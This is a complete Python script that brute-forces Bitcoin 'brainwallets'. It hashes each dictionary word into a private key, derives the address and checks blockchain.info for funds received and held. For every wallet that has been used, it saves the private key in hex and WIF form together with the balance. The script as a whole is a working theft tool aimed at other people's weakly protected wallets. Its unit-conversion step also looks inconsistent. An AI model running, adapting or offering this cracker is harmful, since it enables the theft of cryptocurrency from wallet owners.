#!/usr/bin/env python3
# brute.py
# Minimal iSH-friendly scanner: only p2pkh
# dictionary.txt -> found.txt, one-field-per-line output

from __future__ import annotations
import io, sys, logging, time, binascii, hashlib, random, requests

# crypto libs
try:
    import ecdsa
    import base58
except Exception as e:
    print("Missing dependencies. Install: pip3 install requests ecdsa base58")
    raise

# ------------------ Wallet (p2pkh only) ------------------
class Wallet:
    """
    Wallet(passphrase, is_private_key=False)
    - if is_private_key: accepts hex privkey or WIF
    - else: SHA256(passphrase) -> priv key
    Exposes:
      - private_key (hex)
      - wif
      - addresses dict: only 'p2pkh'
    """
    def __init__(self, passphrase, is_private_key=False):
        self.passphrase = passphrase
        self.is_private_key = bool(is_private_key)
        if self.is_private_key:
            if self._looks_like_hex(self.passphrase):
                self.private_key = self.passphrase.lower()
            else:
                self.private_key = self._wif_to_hex(self.passphrase)
        else:
            self.private_key = binascii.hexlify(hashlib.sha256(self.passphrase.encode('utf-8')).digest()).decode()
        self.wif = self._hex_to_wif(self.private_key)
        self.pubkey_compressed = self._priv_to_compressed_pubkey(self.private_key)
        self.addresses = {}
        self.addresses['p2pkh'] = self._p2pkh_from_pubkey(self.pubkey_compressed)

    def _looks_like_hex(self, s):
        try:
            int(s, 16)
            return len(s) in (64, 66)
        except Exception:
            return False

    def _hex_to_wif(self, priv_hex, compressed=True):
        b = binascii.unhexlify(priv_hex)
        payload = b'\x80' + b
        if compressed:
            payload += b'\x01'
        checksum = hashlib.sha256(hashlib.sha256(payload).digest()).digest()[:4]
        return base58.b58encode(payload + checksum).decode()

    def _wif_to_hex(self, wif):
        try:
            raw = base58.b58decode(wif)
            payload = raw[:-4]
            if len(payload) == 34 and payload[-1] == 0x01:
                key = payload[1:-1]
            else:
                key = payload[1:]
            return binascii.hexlify(key).decode()
        except Exception:
            return ""

    def _priv_to_compressed_pubkey(self, priv_hex):
        priv = binascii.unhexlify(priv_hex)
        sk = ecdsa.SigningKey.from_string(priv, curve=ecdsa.SECP256k1)
        vk = sk.get_verifying_key()
        px = vk.to_string()
        x = px[:32]; y = px[32:]
        prefix = b'\x02' if (y[-1] % 2 == 0) else b'\x03'
        return prefix + x

    def _hash160(self, data_bytes):
        return hashlib.new('ripemd160', hashlib.sha256(data_bytes).digest()).digest()

    def _p2pkh_from_pubkey(self, pubkey_bytes):
        rip = self._hash160(pubkey_bytes)
        pref = b'\x00' + rip
        checksum = hashlib.sha256(hashlib.sha256(pref).digest()).digest()[:4]
        return base58.b58encode(pref + checksum).decode()

    def __repr__(self):
        return "<Wallet priv=%s addr_p2pkh=%s>" % (self.private_key[:8], self.addresses.get('p2pkh'))


# ------------------ BlockchainInfo explorer (p2pkh only) ------------------
class BlockchainInfo:
    def __init__(self):
        self.session = None
        self._base_url = "https://blockchain.info"
        self._base_url_received = f"{self._base_url}/q/getreceivedbyaddress"
        self._base_url_balance = f"{self._base_url}/q/addressbalance"
        self._api_limit_seconds = 1

    def open_session(self):
        self.session = requests.Session()

    def close_session(self):
        if self.session:
            try:
                self.session.close()
            except Exception:
                pass
        self.session = None

    def get_received(self, addr):
        time.sleep(self._api_limit_seconds)
        r = self.session.get(f"{self._base_url_received}/{addr}", timeout=15)
        r.raise_for_status()
        val = float(r.text.strip())
        if val > 1e9:
            val /= 1e8
        return val

    def get_balance(self, addr):
        time.sleep(self._api_limit_seconds)
        r = self.session.get(f"{self._base_url_balance}/{addr}", timeout=15)
        r.raise_for_status()
        val = float(r.text.strip())
        if val > 1e9:
            val /= 1e8
        return val


# ------------------ Main scanner ------------------
def main():
    dict_file = 'dictionary.txt'
    out_file = 'found.txt'
    sleep_between_success = 0.06

    logging.basicConfig(level=logging.INFO, format='%(asctime)s %(levelname)-6s line %(lineno)-4s %(message)s')

    explorer = BlockchainInfo()
    explorer.open_session()

    try:
        f_dictionary = io.open(dict_file, 'rt', encoding='utf-8')
    except Exception as e:
        logging.error("Failed to open dict file %s : %s", dict_file, e)
        sys.exit(1)

    try:
        fout = open(out_file, 'w', encoding='utf-8')
    except Exception as e:
        logging.error("Failed to open output file %s : %s", out_file, e)
        sys.exit(1)

    for raw in f_dictionary:
        word = raw.rstrip()
        if not word:
            continue
        try:
            wallet = Wallet(word)
        except Exception as e:
            logging.warning("Failed to create wallet for '%s': %s", word, e)
            continue

        addr = wallet.addresses.get('p2pkh')
        if not addr:
            continue

        try:
            received = explorer.get_received(addr)
        except Exception:
            received = 0.0

        if received == 0:
            time.sleep(sleep_between_success)
            continue

        try:
            balance = explorer.get_balance(addr)
        except Exception:
            balance = 0.0

        fout.write(f"{word}\np2pkh\n{addr}\n{received:.8f}\n{wallet.private_key}\n{wallet.wif}\n{balance:.8f}\n\n")
        fout.flush()
        logging.info("Found used wallet for word '%s' addr %s", word, addr)
        time.sleep(sleep_between_success)

    explorer.close_session()
    fout.close()
    f_dictionary.close()
    logging.info("Done.")


if __name__ == '__main__':
    main()